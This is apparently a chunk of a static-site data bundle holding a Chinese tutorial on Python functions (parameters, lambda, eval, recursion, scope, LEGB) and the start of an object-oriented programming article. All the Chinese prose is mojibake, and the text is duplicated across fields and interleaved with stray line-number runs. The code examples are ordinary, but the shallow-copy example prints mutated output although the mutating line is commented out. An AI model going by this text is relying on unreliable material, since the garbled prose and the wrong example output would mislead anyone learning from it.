éå¼çæ¶åå°±ä¼ä½¿ç¨é»è®¤å¼ãä½æ¯é»è®¤åæ°è¦æ¾å¨åæ°åè¡¨çæåé¢ã\n\n# å½ååæ°\n\næä»¬ä¹å¯ä»¥æç§åæ°çåç§°ä¼ éåæ°ï¼ä¹ç§°ä¸ºå³é®å­åæ°ï¼è¿ç§ä¼ éåæ°çæ¹å¼ä¸éè¦ä½ç½®çé¡ºåºã\n\n# å¯ååæ°\n\nå¯ååæ°æçæ¯å¨ä¼ éåæ°æ¶ï¼åæ°çæ°éå¯ä»¥åçååãå¨Javaä¸­ä½¿ç¨String .. argsè¡¨ç¤ºå¯ååæ°ãå¨Pythonä¸­ä½¿ç¨*paramä¸ä¸ªæå·ï¼ä»£è¡¨å°å¤ä¸ªåæ°æ¾å¥å°ä¸ä¸ªåç»å¯¹è±¡ä¸­å»ã**paramè¡¨ç¤ºå°å¤ä¸ªåæ°æ¾å¥å°ä¸ä¸ªå­å¸ä¸­å»ã\n\n# å¼ºå¶å½ååæ°\n\nå¨å¯ååæ°åé¢å½åçåæ°å¿é¡»å¨è°ç¨çæ¶åè¿è¡å¼ºå¶çå½åã\n\ndef show1(a,b,c):\n    print(a,b,c)\n\nshow1(1,2,3) # ä½ç½®åæ°\n\ndef show2(a,b,c=10):\n    print(a,b,c)\n\nshow2(1,2) # é»è®¤å¼åæ°\n\ndef show3(a,b,c):\n    print(a,b,c)\n\nshow3(c=1,a=2,b=3) # å½ååæ°\n\ndef show4(*a,**b):\n    print(type(a))\n    print(type(b))\n\nshow4(4,5,6,7,name='zhangsan',age=13) # å¯ååæ°\n\ndef show5(*a,b,c,d):\n    print(type(a))\n\nshow5(1,2,3,4,b=2,c=3,d=4) # å¼ºå¶å½ååæ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# Lambdaè¡¨è¾¾å¼åå¿ååæ°\n\nlambdaè¡¨è¾¾å¼å¯ä»¥ç¨æ¥å£°æä¸ä¸ªå¿åçå½æ°ï¼lambdaå½æ°æ¯ä¸ä¸ªç®åçå¨ä¸è¡ä¸­å®ä¹å½æ°çæ¹æ³ãlambdaä¸­åªè½åå«ä¸ä¸ªè¡¨è¾¾å¼ï¼èä¸è½åå«å¤æçè¯­å¥ï¼è¯¥è¡¨è¾¾å¼è®¡ç®çæ¯å½æ°çè¿åå¼ãlambdaçåºæ¬è¯­æ³å¦ä¸ï¼\n\nlambda arg1,agr2,arg3 : è¡¨è¾¾å¼\n\n\n1\n\n\nä¸¾ä¾å­ï¼\n\nf = lambda a,b,c : a+b+c\nprint(f) # <function <lambda> at 0x7fadf00abd90>\nprint(f(1,2,3)) # 6\n\n\n1\n2\n3\n\n\n\n# evalå½æ°\n\nevalå½æ°å¯ä»¥å°å­ç¬¦ä¸²å½æææçè¡¨è¾¾å¼å¹¶è®¡ç®ç»æã\n\nè¯­æ³ï¼\n\neval(source [,globals[,locals]]) -> value\n\n\n1\n\n\nSource: ä¸ä¸ªPythonè¡¨è¾¾å¼æèå½æ°compileè¿åçä»£ç å¯¹è±¡\n\nglobalsï¼å¯éå¼ï¼è¦æ±æ¯ä¸ä¸ªdictionary\n\nlocalsï¼å¯éå¼ï¼æ å°çä»»æå¯¹è±¡\n\na = 10\nb = 20\neval(\"print(a+b)\") # 30\n\n\n1\n2\n3\n\n\nevalå½æ°ä¼è®²å­ç¬¦ä¸²å½ä½è¯­å¥æ§è¡ï¼å æ­¤éå¸¸çå±é©ã\n\n\n# éå½\n\néå½å¤§æ¦å°±æ¯æèªå·±è°ç¨èªå·±çä¸ä¸ªè¿ç¨ãä¸ä¸ªææçéå½å½æ°è¦åå«ä¸ä¸ªéå½ä½åä¸ä¸ªææçç»æ­¢æ¡ä»¶ï¼å¦åç¨åºä¼ä¸ç´éå½è°ç¨ï¼æç»èå°½èµæºã\n\ndef factorial(n):\n    if n == 1: return 1\n    return n*factorial(n-1)\n\nfor i in range(1,6):\n    print(factorial(i))\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åµå¥å½æ°\n\næ¯å¨å½æ°åé¨å®ä¹çå½æ°ã\n\nåµå¥å½æ°å¨å¤é¨æ æ³è®¿é®ã\n\n\n# nonlocalå³é®å­\n\nnonlocal ç¨äºå£°æå¤å±çå±é¨åé\n\nglobal ç¨æ¥å£°æå¨å±åé\n\na = 10\ndef outer():\n    b = 20\n    def inner():\n        nonlocal b\n        print(b) # 20\n        b = 20\n        global a\n        a = 1000\n    inner()\n    print(b) # 20 \n\nouter()\nprint(a) # 1000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# LEGBè§å\n\nå¨Pythonä¸­ï¼å¦ææ¯è¦æ¥æ¾æä¸ªåéæ¶ï¼æç§LEGBçè§åè¿è¡æ¥æ¾çï¼\n\nLOCAL --- Enclosed --- GLOBAL --- Built in\n\n * Localï¼ æçæ¯å½æ°æèæ¹æ³çåé¨\n * enclosed ï¼æçæ¯åµå¥çå½æ°\n * globalï¼å¼å¾æ¯æ¨¡åä¸­çå¨å±åé\n * built inï¼pythonä¿ççåç§°\n\nå¦ææ¯ä¸ä¸ªé½æ²¡ææ¾å°ï¼å°±ä¼æ¥éãNameERROR",normalizedContent:"# pythonå½æ°çå°ç§å¯\n\n> å½æ°æ¯ä¸ä¸ªå¸¦åå­çä»£ç åï¼éè¿åç§°å¯ä»¥å¨å¶ä»ä½ç½®è°ç¨ä»£ç åä¸­çè¯­å¥æ§è¡ï¼å¾æ¹ä¾¿çå®ç°ä»£ç çå¤ç¨ï¼å¹¶ä¸å¨ä»£ç åä¸­çä»£ç ä¿®æ¹æ¶ï¼å½æ°è°ç¨æ§è¡ä¹ä¼æ§è¡æ°çä»£ç ï¼å æ­¤å½æ°å¯¹äºç¼ç¨è¯­è¨èè¨è³å³éè¦ãå½æ°åå«å½æ°è°ç¨ãä¼ åãè¿åå¼ç­åå®¹ãæä»¬å¨è¿ä¸ç¯ä¸­ï¼ä¸ä¸æ´çåºæ¥ã\n\n\n# å½æ°ç®ä»\n\nä¸ä¸ªç¨åºå¾å¾ä»£è¡¨äºå®ææç§ä»»å¡çä¸ç³»åæä½çéåï¼èå½æ°éå¸¸æ¯å®æè¿ä¸ªä»»å¡å¨é¨æ¹æ³æèæåææä¸é¡¹å·ä½ä»»å¡çåè½æ­¥éª¤çéåãå½æ°æ¯ä»£ç å¤ç¨çéå¸¸æºå¶ï¼éè¿å½æ°æå¤§æ¹ä¾¿äºä»£ç çå¤ç¨ã\n\nå¨pythonä¸­çå½æ°åä¸ºä»¥ä¸å ç§ç±»åï¼\n\n 1. åç½®å½æ°\n    \n    ä¾å¦æä»¬ä¹é´ä½¿ç¨è¿çstr list lenç­ï¼å¯ä»¥ç´æ¥å¨ä»£ç ä¸­è°ç¨\n\n 2. æ ååºå½æ°\n    \n    æä»¬éè¿importè¯­å¥åå¥äºåºï¼ç¶åä½¿ç¨å¶ä¸­å®ä¹çå½æ°\n\n 3. ç¬¬ä¸æ¹å½æ°\n    \n    pythonç¤¾åºæä¾äºé«è´¨éçç¬¬ä¸æ¹åºï¼å®è£è¿äºåºä¹åï¼éè¿importå¯¼å¥ï¼å°±å¯ä»¥ä½¿ç¨ç¬¬ä¸æ¹çå½æ°äº\n\n 4. ç¨æ·èªå®ä¹å½æ°\n    \n    ç¨æ·èªå®ä¹çå½æ°æ¯å¼åä¸­çä¸»ä½ï¼ä¹æ¯å®æé¡¹ç®éæ±çéè¦ç»æï¼æä»¬ä¸»è¦æ¥çå¦ä½èªå®ä¹ç¨æ·å½æ°ã\n\n\n# å®ä¹åè°ç¨\n\npythonä¸­å®ä¹ä¸ä¸ªå½æ°çåºæ¬è¯­æ³å¦ä¸ï¼\n\ndef å½æ°åç§°(åæ°åè¡¨):\n  å½æ°ä½\n\n\n1\n2\n\n\npythonä¸­æ§è¡å°defæ¶ï¼ä¼åå»ºä¸ä¸ªå½æ°çå¯¹è±¡ï¼å¹¶ä¸ç»å®å°å½æ°çåéåç§°ä¹ä¸ãæ¬å·åæ¯å½æ°çå½¢å¼åæ°åè¡¨ï¼å¯ä»¥æ²¡æåæ°ï¼ä½æ¯æ¬å·å¿é¡»ä¿çãå¦æå½æ°ä½ä¸­æreturnè¯­å¥ï¼åå¯ä»¥æ§è¡returnè¿åå¼ï¼å¦ææ²¡æreturnï¼é»è®¤è¿ånoneãæä»¬å¨è°ç¨å½æ°ä¹åï¼å¿é¡»è¦åå®ä¹å½æ°ãåç½®çå½æ°å¯¹è±¡ä¼èªå¨åå»ºï¼æ ååºä¸­çåç¬¬ä¸æ¹åºä¸­çå½æ°ï¼å¨importæ¶ï¼ä¹ä¼æ§è¡æ¨¡åä¸­çdefè¯­å¥ã\n\n\n# å½æ°å½¢ååå®å\n\nå½¢ååå®åå¯ä»¥ç®åçè§£ä¸ºå¨å®ä¹å½æ°æ¶åæ°åè¡¨ä¸­çåæ°ä¸ºå½¢åï¼å¨å®éè°ç¨ä¼ éç»å½æ°çåæ°ä¸ºå®åã\n\n\n# ææ¡£å­ç¬¦ä¸²\n\nå¨ç¨åºä¸­ï¼æä»¬éå¸¸ä½¿ç¨äºå·ç¼åä¸æ®µæ³¨éï¼å¨å½æ°ä¸­ï¼éå¸¸å¨å½æ°é¢å¼å§çé¨åéä¸ä¸æ®µå½æ°çå®ä¹è¯´æï¼è¿å°±æ¯ææ¡£å­ç¬¦ä¸²ä¹ç§°ä¸ºå½æ°æ³¨éï¼éå¸¸ä½¿ç¨ä¸ä¸ªåå¼å·æèåå¼å·å®ç°ãä¹åå¯ä»¥éè¿print(å½æ°å.__doc__)è¾åºææ¡£å­ç¬¦ä¸²ï¼\n\ndef hello():\n    '''this is a hello world program...'''\n    print(\"helloworld\")\n\nprint(hello.__doc__) # this is a hello world program...\n\n\n1\n2\n3\n4\n5\n\n\n\n# è¿åå¼\n\nå¦æå½æ°ä½ä¸­åå«äºreturnè¯­å¥ï¼åä¼ç»æå½æ°çæ§è¡å¹¶ä¸è¿åè¿åå¼ï¼\n\nå¦æå½æ°ä½ä¸­ä¸åå«returnè¯­å¥ï¼åé»è®¤è¿ånone\n\nå¦æéååè¿åå¤ä¸ªå¼ï¼åä½¿ç¨åºåå°å¶å­èµ·æ¥ï¼ä¸èµ·è¿å\n\n\n# åéçä½ç¨å\n\nä¸ååéçä½ç¨èå´ä¸åï¼åéçä½ç¨èå´ç§°ä¸ºåéçä½ç¨åï¼ä¸åä½ç¨ååçåååéä¸åå½±åãåéå¯ä»¥åä¸ºå¨å±åéåå±é¨åéï¼\n\n * å¨å±åé\n   * å¨å½æ°åç±»å®ä¹ä¹å¤å£°æçåéï¼ä½ç¨åæ¯å®ä¹çæ¨¡åï¼ä»å®ä¹å¼å§å°æ´ä¸ªæ¨¡åçç»æ\n   * å¨å±åééä½å½æ°çéç¨æ§åå¯è¯»æ§ï¼é¿åä½¿ç¨å¨å±åé\n   * å¨å±åéä¸è¬ä½ä¸ºå¸¸éä½¿ç¨ï¼å½æ°åå¦æéè¦æ¹åå¨å±åéçå¼ï¼åéè¦globalå£°æ\n * å±é¨åé\n   * å±é¨åéæ¯å¨å½æ°ä½ä¸­å£°æçåé\n   * å±é¨åéçå¼ç¨è¦æ¯å¨å±åéå¿«ï¼å æ­¤ä¼åä½¿ç¨å±é¨åé\n   * å±é¨åéåå¨å±åéååï¼åä¼åshiyong ååçå±é¨åéï¼å°±è¿ååã\n\n\n# pythonä¸­çåæ°ä¼ é\n\nå½æ°çåæ°ä¼ éæ¬è´¨ä¸å°±æ¯å°å®éåæ°çå¼èµå¼ç»å½¢åçè¿ç¨ãå¨pythonä¸­ï¼ä¸åçæ¯å¯¹è±¡ï¼ææçèµå¼æä½é½æ¯å¼ç¨å¤å¶ãå æ­¤pythonä¸­çææåæ°ä¼ éé½æ¯å¼ç¨ä¼ éèä¸æ¯å¼ä¼ éãå æ­¤å¯¹äºå¯åå¯¹è±¡çåæä½ä¼ç´æ¥ä½ç¨ååæ¥çå¯¹è±¡ï¼å¯¹ä¸å¯åå¯¹è±¡çåæä½ï¼ä¼äº§çä¸ä¸ªæ°çå¯¹è±¡ï¼å¹¶å¡«åæ°çå¼ï¼æ¯ä¸ç§åçå¼ä¼ éã\n\nå¯åçå¯¹è±¡æï¼å­å¸ãåè¡¨ãéåãèªå®ä¹çå¯¹è±¡ç­\n\nä¸å¯åçå¯¹è±¡ï¼æ°å­ãå­ç¬¦ä¸²ãåç»ãæ¹æ³ç­ã\n\nå¨ä¼ éå¯åå¯¹è±¡æ¶ï¼å¦ä¼ éçæ¯ä¸ä¸ªåè¡¨ï¼åå¦æå¨å½æ°ä¸­ä¿®æ¹äºå½¢åçå¼ï¼å®éä¸å®åçå¼ä¹ä¼æ¹åãå¦æä¼ éçæ¯ä¸å¯åçå¯¹è±¡ï¼å ä¸ºåæ°çå¼ä¸å¯åï¼åä¼å¤å¶ä¸ä»½åºæ¥ï¼éæ°åå»ºä¸ä¸ªå¯¹è±¡ï¼å°±åå¶ä»è¯­è¨ä¸­çå¼ä¼ éä¸æ ·ã\n\nä¾å­ï¼\n\ndef add1(n):\n    n -= 1\n\ndef add2(n):\n    n[0] -= 1\n\na = 1\nadd1(a)\nprint(a) # 1\n\na = list()\na.append(1)\nadd2(a)\nprint(a[0]) # 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¦ææä¸ªæ¹æ³ä¼ éçæ¯ä¸ä¸ªä¸å¯åå¯¹è±¡ä½ä¸ºåæ°ï¼ä½æ¯åæ°ä¸­åå«äºä¸ä¸ªå¯åå¯¹è±¡ï¼åå½æ°åä¿®æ¹å¯åå¯¹è±¡ä¹ä¼å½±åå½æ°å¤çåæ°çå¼ã\n\n\n# æ·±æ·è´åæµæ·è´\n\næ·±æ·è´ä¼åæ¬èªå¯¹è±¡ä¸èµ·æ·è´ï¼å¯¹å­å¯¹è±¡çä¿®æ¹ä¸ä¼å½±ååæ¥çå¯¹è±¡\n\næµæ·è´ä¸ä¼æ·è´èªå¯¹è±¡çåå®¹ï¼åªæ¯æ·è´äºå­å¯¹è±¡çå¼ç¨ã\n\nå¨pythonä¸­ä½¿ç¨copyå®ææµæ·è´ï¼ä½¿ç¨deepcopyå®ææ·±æ·è´\n\na = [1,2,3,[4,5,6]]\n\nb = copy.copy(a)\n# b[3][0] = 1\nprint(b) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [1, 5, 6]]\n\nc = copy.deepcopy(a)\nc[3][0] = 1\nprint(c) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [4, 5, 6]] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# åæ°çå ç§ç±»å\n\n# ä½ç½®åæ°\n\nå½æ°è°ç¨æ¶ï¼å®éåæ°é»è®¤æç§ä½ç½®é¡ºåºä¼ éï¼å æ­¤éè¦ä¼ éçå½¢åä¸ªæ°åå®éçåæ°å¹éãæä½ç½®ä¼ éåæ°ç§°ä¸ºï¼ä½ç½®åæ°ã\n\n# é»è®¤å¼åæ°\n\nå¨å£°æå½æ°æ¶ï¼å¯ä»¥ä¸ºåæ°è®¾ç½®é»è®¤å¼ï¼è¿æ ·è¿ä¸ªåæ°å°±æ¯å¯éçäºï¼å æ­¤å¨æ²¡æä¼ éå¼çæ¶åå°±ä¼ä½¿ç¨é»è®¤å¼ãä½æ¯é»è®¤åæ°è¦æ¾å¨åæ°åè¡¨çæåé¢ã\n\n# å½ååæ°\n\næä»¬ä¹å¯ä»¥æç§åæ°çåç§°ä¼ éåæ°ï¼ä¹ç§°ä¸ºå³é®å­åæ°ï¼è¿ç§ä¼ éåæ°çæ¹å¼ä¸éè¦ä½ç½®çé¡ºåºã\n\n# å¯ååæ°\n\nå¯ååæ°æçæ¯å¨ä¼ éåæ°æ¶ï¼åæ°çæ°éå¯ä»¥åçååãå¨javaä¸­ä½¿ç¨string .. argsè¡¨ç¤ºå¯ååæ°ãå¨pythonä¸­ä½¿ç¨*paramä¸ä¸ªæå·ï¼ä»£è¡¨å°å¤ä¸ªåæ°æ¾å¥å°ä¸ä¸ªåç»å¯¹è±¡ä¸­å»ã**paramè¡¨ç¤ºå°å¤ä¸ªåæ°æ¾å¥å°ä¸ä¸ªå­å¸ä¸­å»ã\n\n# å¼ºå¶å½ååæ°\n\nå¨å¯ååæ°åé¢å½åçåæ°å¿é¡»å¨è°ç¨çæ¶åè¿è¡å¼ºå¶çå½åã\n\ndef show1(a,b,c):\n    print(a,b,c)\n\nshow1(1,2,3) # ä½ç½®åæ°\n\ndef show2(a,b,c=10):\n    print(a,b,c)\n\nshow2(1,2) # é»è®¤å¼åæ°\n\ndef show3(a,b,c):\n    print(a,b,c)\n\nshow3(c=1,a=2,b=3) # å½ååæ°\n\ndef show4(*a,**b):\n    print(type(a))\n    print(type(b))\n\nshow4(4,5,6,7,name='zhangsan',age=13) # å¯ååæ°\n\ndef show5(*a,b,c,d):\n    print(type(a))\n\nshow5(1,2,3,4,b=2,c=3,d=4) # å¼ºå¶å½ååæ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# lambdaè¡¨è¾¾å¼åå¿ååæ°\n\nlambdaè¡¨è¾¾å¼å¯ä»¥ç¨æ¥å£°æä¸ä¸ªå¿åçå½æ°ï¼lambdaå½æ°æ¯ä¸ä¸ªç®åçå¨ä¸è¡ä¸­å®ä¹å½æ°çæ¹æ³ãlambdaä¸­åªè½åå«ä¸ä¸ªè¡¨è¾¾å¼ï¼èä¸è½åå«å¤æçè¯­å¥ï¼è¯¥è¡¨è¾¾å¼è®¡ç®çæ¯å½æ°çè¿åå¼ãlambdaçåºæ¬è¯­æ³å¦ä¸ï¼\n\nlambda arg1,agr2,arg3 : è¡¨è¾¾å¼\n\n\n1\n\n\nä¸¾ä¾å­ï¼\n\nf = lambda a,b,c : a+b+c\nprint(f) # <function <lambda> at 0x7fadf00abd90>\nprint(f(1,2,3)) # 6\n\n\n1\n2\n3\n\n\n\n# evalå½æ°\n\nevalå½æ°å¯ä»¥å°å­ç¬¦ä¸²å½æææçè¡¨è¾¾å¼å¹¶è®¡ç®ç»æã\n\nè¯­æ³ï¼\n\neval(source [,globals[,locals]]) -> value\n\n\n1\n\n\nsource: ä¸ä¸ªpythonè¡¨è¾¾å¼æèå½æ°compileè¿åçä»£ç å¯¹è±¡\n\nglobalsï¼å¯éå¼ï¼è¦æ±æ¯ä¸ä¸ªdictionary\n\nlocalsï¼å¯éå¼ï¼æ å°çä»»æå¯¹è±¡\n\na = 10\nb = 20\neval(\"print(a+b)\") # 30\n\n\n1\n2\n3\n\n\nevalå½æ°ä¼è®²å­ç¬¦ä¸²å½ä½è¯­å¥æ§è¡ï¼å æ­¤éå¸¸çå±é©ã\n\n\n# éå½\n\néå½å¤§æ¦å°±æ¯æèªå·±è°ç¨èªå·±çä¸ä¸ªè¿ç¨ãä¸ä¸ªææçéå½å½æ°è¦åå«ä¸ä¸ªéå½ä½åä¸ä¸ªææçç»æ­¢æ¡ä»¶ï¼å¦åç¨åºä¼ä¸ç´éå½è°ç¨ï¼æç»èå°½èµæºã\n\ndef factorial(n):\n    if n == 1: return 1\n    return n*factorial(n-1)\n\nfor i in range(1,6):\n    print(factorial(i))\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åµå¥å½æ°\n\næ¯å¨å½æ°åé¨å®ä¹çå½æ°ã\n\nåµå¥å½æ°å¨å¤é¨æ æ³è®¿é®ã\n\n\n# nonlocalå³é®å­\n\nnonlocal ç¨äºå£°æå¤å±çå±é¨åé\n\nglobal ç¨æ¥å£°æå¨å±åé\n\na = 10\ndef outer():\n    b = 20\n    def inner():\n        nonlocal b\n        print(b) # 20\n        b = 20\n        global a\n        a = 1000\n    inner()\n    print(b) # 20 \n\nouter()\nprint(a) # 1000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# legbè§å\n\nå¨pythonä¸­ï¼å¦ææ¯è¦æ¥æ¾æä¸ªåéæ¶ï¼æç§legbçè§åè¿è¡æ¥æ¾çï¼\n\nlocal --- enclosed --- global --- built in\n\n * localï¼ æçæ¯å½æ°æèæ¹æ³çåé¨\n * enclosed ï¼æçæ¯åµå¥çå½æ°\n * globalï¼å¼å¾æ¯æ¨¡åä¸­çå¨å±åé\n * built inï¼pythonä¿ççåç§°\n\nå¦ææ¯ä¸ä¸ªé½æ²¡ææ¾å°ï¼å°±ä¼æ¥éãnameerror",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythoné¢åå¯¹è±¡çé£äºäº",frontmatter:{title:"Pythoné¢åå¯¹è±¡çé£äºäº",date:"2022-03-25T20:00:00.000Z",permalink:"/sec/dev/python/oop",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/04.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/04.Pythoné¢åå¯¹è±¡çé£äºäº.md",key:"v-40cc2fb1",path:"/sec/dev/python/oop/",headers:[{level:2,title:"é¢åå¯¹è±¡ç®ä»",slug:"é¢åå¯¹è±¡ç®ä»",normalizedTitle:"é¢åå¯¹è±¡ç®ä»",charIndex:152},{level:2,title:"ç±»",slug:"ç±»",normalizedTitle:"ç±»",charIndex:245},{level:3,title:"__init__æé æ¹æ³å__new__æ¹æ³",slug:"init-æé æ¹æ³å-new-æ¹æ³",normalizedTitle:"__init__æé æ¹æ³å__new__æ¹æ³",charIndex:876},{level:3,title:"å®ä¾å±æ§åå®ä¾æ¹æ³",slug:"å®ä¾å±æ§åå®ä¾æ¹æ³",normalizedTitle:"å®ä¾å±æ§åå®ä¾æ¹æ³",charIndex:1501},{level:3,title:"ç±»å¯¹è±¡ãç±»å±æ§ãç±»æ¹æ³ãéææ¹æ³",slug:"ç±»å¯¹è±¡ãç±»å±æ§ãç±»æ¹æ³ãéææ¹æ³",normalizedTitle:"ç±»å¯¹è±¡ãç±»å±æ§ãç±»æ¹æ³ãéææ¹æ³",charIndex:2755},{level:3,title:"__del__æ¹æ³ååå¾åæ¶",slug:"del-æ¹æ³ååå¾åæ¶",normalizedTitle:"__del__æ¹æ³ååå¾åæ¶",charIndex:3759},{level:3,title:"__call__æ¹æ³åå¯è°ç¨å¯¹è±¡",slug:"call-æ¹æ³åå¯è°ç¨å¯¹è±¡",normalizedTitle:"__call__æ¹æ³åå¯è°ç¨å¯¹è±¡",charIndex:4171},{level:3,title:"æ¹æ³éè½½",slug:"æ¹æ³éè½½",normalizedTitle:"æ¹æ³éè½½",charIndex:4369},{level:3,title:"æ¹æ³çå¨ææ§",slug:"æ¹æ³çå¨ææ§",normalizedTitle:"æ¹æ³çå¨ææ§",charIndex:4686},{level:3,title:"ç§æå±æ§åç§ææ¹æ³",slug:"ç§æå±æ§åç§ææ¹æ³",normalizedTitle:"ç§æå±æ§åç§ææ¹æ³",charIndex:5023},{level:3,title:"@propertyè£é¥°å¨",slug:"propertyè£é¥°å¨",normalizedTitle:"@propertyè£é¥°å¨",charIndex:5662},{level:2,title:"é¢åå¯¹è±¡çä¸å¤§ç¹å¾",slug:"é¢åå¯¹è±¡çä¸å¤§ç¹å¾",normalizedTitle:"é¢åå¯¹è±¡çä¸å¤§ç¹å¾",charIndex:6527},{level:3,title:"ç»§æ¿",slug:"ç»§æ¿",normalizedTitle:"ç»§æ¿",charIndex:208},{level:3,title:"å¤æ",slug:"å¤æ",normalizedTitle:"å¤æ",charIndex:214}],headersStr:"é¢åå¯¹è±¡ç®ä» ç±» __init__æé æ¹æ³å__new__æ¹æ³ å®ä¾å±æ§åå®ä¾æ¹æ³ ç±»å¯¹è±¡ãç±»å±æ§ãç±»æ¹æ³ãéææ¹æ³ __del__æ¹æ³ååå¾åæ¶ __call__æ¹æ³åå¯è°ç¨å¯¹è±¡ æ¹æ³éè½½ æ¹æ³çå¨ææ§ ç§æå±æ§åç§ææ¹æ³ @propertyè£é¥°å¨ é¢åå¯¹è±¡çä¸å¤§ç¹å¾ ç»§æ¿ å¤æ",content:"# Pythoné¢åå¯¹è±¡çé£äºäº\n\n> Pythonæ¯ä¸é¨æ¯æé¢åå¯¹è±¡çé«çº§ç¨åºè®¾è®¡è¯­è¨ãé¢åå¯¹è±¡åé¢åè¿ç¨çç¨åºè®¾è®¡è¯­è¨ä¸åï¼é¢åå¯¹è±¡æ´åæ¯æ­ç§¯æ¨ï¼å°ä¸åä¸åç°æçåè½ç»åè°ç¨å®ææä»¬çä»»å¡ãèé¢åè¿ç¨éè¦æä»¬å»æèæ¯ä¸æ­¥åºè¯¥æä¹å»åãè¿ä¸ç¯æä»¬ä¸èµ·æ¥ççPythonä¸­çé¢åå¯¹è±¡çç¸å³ç¥è¯ã\n\n\n# é¢åå¯¹è±¡ç®ä»\n\nPythonæ¯ä¸é¨å®å¨éç¨äºé¢åå¯¹è±¡ææ³è®¾è®¡çé«çº§è¯­è¨ï¼å¯ä»¥å®å¨æ¯æé¢åå¯¹è±¡ä¸­çåºæ¬åè½ï¼æ¯å¦ï¼ç»§æ¿ãå°è£ãå¤æç­ãå¨Pythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼åæ¬æä»¬åé¢æå°è¿çæ°æ®ç±»åãå½æ°ç­ã\n\né¢åå¯¹è±¡åé¢åè¿ç¨ä¸åçæ¯ï¼é¢åè¿ç¨æ´å å³æ³¨ç¨åºçæ§è¡æµç¨åé»è¾ï¼é¢åè¿ç¨æ´å å³æ³¨çæ¯è½¯ä»¶å¯¹è±¡ä¹é´çå³ç³»ï¼æ¯ä¸ç§å¸åçè®¾è®¡èçæç»´ã\n\n\n# ç±»\n\nç±»æ¯ä»ä¹ï¼ç®åæ¥è¯´ï¼ç±»æ¯ä¸äºå·æç¸åç¹å¾äºç©çæ½è±¡ï¼æ¯å¦ä¸å é¥¼å¹²ï¼ç±»å°±æ¯é é¥¼å¹²çç£¨å·ã\n\næä»¬éè¿ç±»æ¥å®ä¹æ°æ®ç±»åçå±æ§åæ¹æ³ï¼ç±»å¯ä»¥å°è¡ä¸ºåç¶ææ¾å°ä¸èµ·ãèå¯¹è±¡å°±æ¯ä¸ä¸ªç±»çå®ä¾ï¼å¯ä»¥çä½æ¯é¥¼å¹²ãä¸ä¸ªç±»åå»ºå¯¹è±¡æ¶ï¼ä¼å±äº«ç±»ä¸­å®ä¹çæ¹æ³ï¼ä½æ¯ä¸ä¼å±äº«ç±»ä¸­çæ°æ®ã\n\nPythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼å æ­¤ç±»ä¹æ¯å¯¹è±¡ï¼ç±»ç§°ä¸ºç±»å¯¹è±¡ï¼ç±»çå®ä¾ç§°ä¸ºå®ä¾å¯¹è±¡ã\n\næä¹å®ä¹ä¸ä¸ªç±»ï¼å®ä¹ä¸ä¸ªç±»æå¦ä¸çå ä¸ªè¦æ±ï¼\n\n 1. ç±»åç§°è¦ç¬¦åæ è¯ç¬¦çå®ä¹è§åï¼é¦å­æ¯å¤§åï¼ä½¿ç¨é©¼å³°å½ååå\n 2. ç±»ä¸­å¯ä»¥å®ä¹å±æ§åæ¹æ³\n 3. ç±»ä¸­çå±æ§ç¨äºæè¿°æ°æ®ï¼æ¹æ³ç¨äºæè¿°æ°æ®ç¸å³çä¸äºæä½ã\n\nclass Student:\n    def __init__(self,name,score):\n        self.name = name\n        self.score = score\n\n    def say_score(self):\n        print(self.name,'åæ°æ¯ï¼',self.score)\n\n\ns1 = Student(\"zhangsan\",20)\ns1.say_score() # zhangsan åæ°æ¯ï¼ 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# __init__æé æ¹æ³å__new__æ¹æ³\n\nç±»æ¯æ½è±¡çï¼ç±»æ¯å¯¹è±¡çæ¨¡çï¼æä»¬å¯ä»¥éè¿ç±»æ¨¡çåå»ºåºç±»çå®ä¾å¯¹è±¡ï¼ç¶åè°ç¨å®ä¾å¯¹è±¡çç¸å³åè½ãä¸ä¸ªPythonçå¯¹è±¡åå«å¦ä¸çå ä¸ªé¨åï¼\n\n 1. id identityè¯å«ç \n 2. type å¯¹è±¡çç±»å\n 3. value å¯¹è±¡çå¼\n    1. å±æ§ attribute\n    2. æ¹æ³ method\n\nå¨åå»ºä¸ä¸ªç±»æ¶ï¼æä»¬éè¦å®ä¹ä¸ä¸ªæé æ¹æ³ï¼__init__ï¼è¯¥æ¹æ³ç±»ä¼¼äºJavaä¸­çåç±»ååçæ¹æ³ï¼ç¨äºå®ä¾å¯¹è±¡çåå§åãå¨åå»ºå¯¹è±¡åï¼æ§è¡è¯¥æ¹æ³ï¼åå§åå¯¹è±¡çç¸å³å±æ§ã\n\n__init__æ¹æ³çç¸å³è¦ç¹ï¼\n\n 1. åç§°åºå®ã\n 2. ç¬¬ä¸ä¸ªåæ°åºå®ä¸ºselfãselfæçæ¯åååå»ºçå¯¹è±¡\n 3. æé å½æ°éå¸¸ç¨æ¥åå§åå®ä¾å¯¹è±¡çå®ä¾å±æ§\n 4. éè¿ç±»å(å½¢ååè¡¨)è°ç¨æé 